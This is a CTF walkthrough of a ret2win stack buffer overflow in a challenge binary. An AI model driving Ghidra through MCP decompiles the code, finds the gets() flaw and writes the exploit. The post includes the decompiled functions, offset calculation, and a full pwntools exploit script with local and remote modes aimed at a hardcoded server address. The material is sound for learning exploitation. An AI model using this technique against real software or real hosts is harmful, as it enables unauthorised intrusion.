# VibePwning - BDSEC CTF 2025

## Overview

This walkthrough demonstrates how I analyzed and exploited a buffer overflow vulnerability in a CTF challenge using **Claude AI with the Ghidra MCP (Model Context Protocol) server**. This setup allows Claude to directly interact with Ghidra for reverse engineering analysis. In a competition category that is normally riddled with gatekeeping and confusion, I was able to place in top 30% within a fraction of the time and effort spent on easier challenges. This is great and awful news for Cybersecurity professionals. The barrier to entry is getting lower, **and** *the barrier to entry is getting lower.*

## Tools Used

- **Claude Sonnet 4** - AI assistant for analysis and exploit development
- **Ghidra** - Reverse engineering framework
- **Ghidra MCP Server** https://github.com/LaurieWired/GhidraMCP - Enables Claude to control Ghidra programmatically
- **Python + pwntools** - Exploit development
- **GDB + GEF** - Dynamic Analysis Environment
- **Kali Linux** - Testing environment

## Initial Challenge Analysis

The challenge provided a binary called `vuln1` with a simple prompt asking for input.

![Woody's Hidden Trigger](img/blog/woodys-hidden-trigger.png)

The binary is a simple program that asks for input and then prints it back.

## Setting Up the Analysis Environment

I began by setting up GDB with GEF for dynamic analysis. The first step was to understand the program's structure and identify potential vulnerability points.

![Initial Breakpoint Set in GDB](img/blog/initial-breakpoint-set-gdb.png)

By examining the disassembly and comparing it with Ghidra's decompiled output, I could get a clearer picture of the program's internal structure.

![Ghidra Comparison for GDB](img/blog/ghidra-comparison-for-gdb.png)

This dual analysis approach - combining dynamic analysis with static reverse engineering - is crucial for understanding modern binaries.

## Identifying the Vulnerability

The key to any buffer overflow challenge is understanding exactly where the vulnerability lies. I used a cyclic pattern to identify the exact offset where we can control the return address.

```bash
gef➤  pattern create 50
[+] Saved as '$_gef0'
```

![Cyclic Pattern Identified](img/blog/cyclic-pattern-identified.png)

This pattern helps us determine exactly how many bytes we need to overflow before we can control the return address. The pattern creates a unique sequence that, when the program crashes, tells us exactly where our input overwrites the return address.

## AI-Assisted Analysis

This is where the magic happens. Using Claude with the Ghidra MCP server, I was able to get instant analysis of the binary's structure and vulnerabilities.

![MCP Identify Vulnerability](img/blog/mcp-identify-vulnerability.png)

Claude was able to:
1. **Get the current function** I was analyzing in Ghidra
2. **Decompile the vulnerable function** to reveal the source code
3. **Identify the vulnerability**: The `gets()` function doesn't perform bounds checking

The vulnerable function looked like this:
```c
void vuln(void) {
  char local_2c [36];
  printf("Woody needs your input: ");
  gets(local_2c);  // ← VULNERABILITY HERE
  printf("You entered: %s\n",local_2c);
  return;
}
```

## Exploit Development

With the vulnerability identified, Claude helped me develop the exploit strategy.

![MCP Write Python Exploit](img/blog/mcp-write-python-exploit.png)

The analysis revealed that this was a classic **ret2win** challenge. The binary had a `win` function that would read and print the flag:

```c
void win(void) {
  char local_74 [100];
  FILE *local_10;
  
  local_10 = fopen("flag.txt", "r");
  if (local_10 == NULL) {
    puts("Flag file is missing!");
    exit(1);
  }
  fgets(local_74, 100, local_10);
  printf("Woody says: Here's the flag, partner! %s\n", local_74);
  fclose(local_10);
  return;
}
```

## Environment Setup

To run the exploit, I created a virtual python environment using `uv`. `uv`, `conda`, and other venv managers are super useful for these challenges, as they allow you to install whatever dependencies you need without worrying about conflicts.

```bash
┌──(kali㉿kali)-[~]
└─$ uv venv ctf

┌──(kali㉿kali)-[~]
└─$ source ./ctf/bin/activate

┌──(ctf)─(kali㉿kali)-[/mnt/vm-share/bdsec]
└─$ uv pip install pwntools  
```

## Refining the Exploit

The initial exploit attempt had some issues, but Claude helped me fix them quickly. The issues arose because I did not prompt Claude for a ret2win exploit chain, so it defaulted to trying ret2libc.

![MCP After Error Write Fixed Exploit](img/blog/mcp-after-error-write-fixed-exploit.png)

The key was understanding the exact stack layout:
- 36-byte buffer
- 4-byte saved EBX
- 4-byte saved EBP  
- 4-byte return address

**Total offset: 44 bytes**

## Testing the Exploit

The first test run showed some issues that needed to be addressed.

![Initial Exploit Failure](img/blog/initial-exploit-failure.png)

But after some adjustments, the local exploit worked perfectly.

![Local Exploit Success](img/blog/local-exploit-success.png)

## Remote Exploitation

With the local exploit working, it was time to adapt it for the remote target. CLaude generated this script with that already in mind, so all I had to do was add a `remote` flag and update the proper variables in the script.

![Change Exploit to Remote](img/blog/change-exploit-to-remote.png)

## Final Success

The remote exploit worked perfectly, and captured the flag.

![Exploit Success Remote](img/blog/exploit-success-remote.png)

## The Complete Exploit

Here's the final working exploit that captured the flag:

```python
#!/usr/bin/env python3
"""
Buffer Overflow Exploit for BDSEC CTF 2025
Target: vuln function with gets() vulnerability
Strategy: ret2win - jump to win function
"""

import struct
import subprocess
import sys
from pwn import *

# Configuration
BINARY_PATH = "./vuln1"
WIN_FUNCTION_ADDR = 0x08049276  # Address of win function
BUFFER_SIZE = 36
OFFSET_TO_RET = 44  # Buffer (36) + saved EBX (4) + saved EBP (4) = 44

def exploit_ret2win():
    """
    Simple ret2win exploit - overwrite return address with win function
    """
    print("[*] Building ret2win payload...")
    
    # Create payload: buffer padding + win function address
    payload = b'A' * OFFSET_TO_RET
    payload += p32(WIN_FUNCTION_ADDR)
    
    print(f"[*] Win function address: 0x{WIN_FUNCTION_ADDR:x}")
    print(f"[*] Payload length: {len(payload)}")
    
    return payload

def test_offset():
    """
    Test the offset calculation using a pattern
    """
    print("[*] Testing offset calculation...")
    
    # Create a unique pattern to identify exact offset
    pattern = cyclic(60)
    
    try:
        p = process(BINARY_PATH)
        p.recvuntil(b"input: ")
        p.sendline(pattern)
        
        # Try to get crash info
        try:
            output = p.recv(timeout=1)
            print(f"[*] Program output: {output}")
        except:
            pass
            
        p.wait()
        
        # Check if process crashed
        if p.poll() == -11:  # SIGSEGV
            print("[+] Program crashed as expected")
        else:
            print(f"[!] Unexpected exit code: {p.poll()}")
            
        p.close()
        
    except Exception as e:
        print(f"[!] Error testing offset: {e}")

def main():
    # Set up pwntools context
    context.arch = 'i386'
    context.os = 'linux'
    context.log_level = 'info'
    
    print("=" * 50)
    print("BDSEC CTF 2025 - Buffer Overflow Exploit")
    print("Strategy: ret2win")
    print("=" * 50)
    
    # Check if binary exists
    if not os.path.exists(BINARY_PATH):
        print(f"[!] Binary not found: {BINARY_PATH}")
        return
    
    # Test offset first (optional)
    if len(sys.argv) > 1 and sys.argv[1] == "test":
        test_offset()
        return
    
    # Build exploit
    payload = exploit_ret2win()
    
    # Launch exploit
    print("[*] Launching exploit...")
    
    try:
        # For remote connection, update these details
        if len(sys.argv) > 1 and sys.argv[1] == "remote":
            HOST = "45.33.118.86"  # Update with actual host
            PORT = 9991                   # Update with actual port
            print(f"[*] Connecting to {HOST}:{PORT}")
            p = remote(HOST, PORT)
        else:
            print("[*] Starting local process")
            p = process(BINARY_PATH)
        
        # Send payload
        print("[*] Waiting for input prompt...")
        p.recvuntil(b"input: ")
        
        print("[*] Sending payload...")
        p.sendline(payload)
        
        # Receive output
        print("[*] Receiving response...")
        try:
            response = p.recvall(timeout=5)
            print(f"[+] Response:\n{response.decode('utf-8', errors='ignore')}")
            
            # Check if we got the flag
            if b"flag" in response.lower() or b"bdsec" in response.lower():
                print("[+] SUCCESS! Flag should be in the output above!")
            else:
                print("[!] No flag found in output - exploit may have failed")
                
        except Exception as e:
            print(f"[!] Error receiving response: {e}")
            
        p.close()
        
    except Exception as e:
        print(f"[!] Exploit failed: {e}")

if __name__ == "__main__":
    main()
```

## Key Advantages of Using Claude + Ghidra MCP

### Automated Analysis

- Claude could directly query Ghidra's database without manual copying
- Instant access to decompiled code, assembly, and binary metadata
- Streamlined workflow from analysis to exploitation

### Intelligent Interpretation

- Claude understood the vulnerability pattern immediately
- Correctly identified this as a ret2win scenario
- Provided context about why certain exploitation techniques wouldn't work

### Integrated Workflow

- Seamless transition from reverse engineering to exploit development
- No context switching between tools
- Real-time analysis and decision making

## Why This Approach Works

1. **No stack canaries** - We can overwrite the return address without detection
2. **PIE disabled** - The win function address is fixed and predictable
3. **Simple target** - We don't need to chain ROP gadgets or find system calls
4. **Direct path** - One function call gets us the flag

## Lessons Learned

1. **Modern CTF patterns**: Many challenges include "win" functions rather than requiring complex ROP chains
2. **Tool integration value**: Having AI directly control reverse engineering tools significantly speeds up analysis
3. **Systematic approach**: Even with AI assistance, following a methodical process (protections → vulnerability → targets → exploitation) is crucial

## The Future of Offensive Security

This walkthrough demonstrates how AI-assisted reverse engineering can dramatically accelerate CTF challenge solving while maintaining educational value about the underlying techniques. It also hauntingly highlights how accelerated offensive security operations have become, and a call to all responsible parties to become educated on the effects that AI is having on the Cybersecurity landscape.

The barrier to entry for offensive security is indeed getting lower, but so is the barrier to entry for defensive security. The key is staying ahead of the curve and understanding how these tools can be used both for and against us.
